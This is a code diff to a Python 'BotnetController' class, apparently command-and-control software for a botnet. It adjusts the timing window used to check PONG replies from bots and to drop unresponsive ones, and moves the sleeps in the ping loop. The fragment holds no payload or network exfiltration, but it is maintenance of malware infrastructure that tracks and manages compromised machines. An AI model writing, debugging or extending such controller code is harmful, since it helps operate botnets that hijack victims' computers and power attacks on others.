@@ -95,8 +95,8 @@ class BotnetController:
         self.command_rooms = {}
         self.command_room_lock = threading.Lock()
         
-        self.pong_window_end = 0
-        self.pong_window_dur = 20
+        self.pong_window_start = 0
+        self.pong_window_dur = 30
 
     def login(self):
         # login and sync
@@ -187,8 +187,8 @@ class BotnetController:
         elif action == "PONG":
             room_id, bot_id, pong_origin = info.rsplit(":", 2)
             pong_origin = float(pong_origin)
-            print("start:", self.pong_window_end - self.pong_window_dur, "origin:", pong_origin, "end:", self.pong_window_end)
-            if not (self.pong_window_end - self.pong_window_dur <= pong_origin <= self.pong_window_end):
+            print("start:", self.pong_window_start, "origin:", pong_origin, "end:", self.pong_window_start + self.pong_window_dur)
+            if not (self.pong_window_start <= pong_origin <= self.pong_window_start + self.pong_window_dur):
                 # pong too late :(
                 print("PONG TOO LATE")
                 self.send_command(f"CLEAR:{bot_id}", self.command_rooms[room_id])
@@ -210,21 +210,21 @@ class BotnetController:
     def ping_loop(self):
         time.sleep(5)
         while True:
+            time.sleep(10)
             # Mark
             with self.command_room_lock:
                 for room in self.command_rooms.values():
                     room.set_all_inactive()
 
+            self.pong_window_start = time.time()
             self.send_to_all("PING")
             time.sleep(self.pong_window_dur) # give time for pongs to come in
-            self.pong_window_end = time.time()
             
             # and Sweep
             with self.command_room_lock:
                 for room in self.command_rooms.values():
                     room.delete_inactive_bots()
                     
-            time.sleep(8)
                         
 
     def run(self):
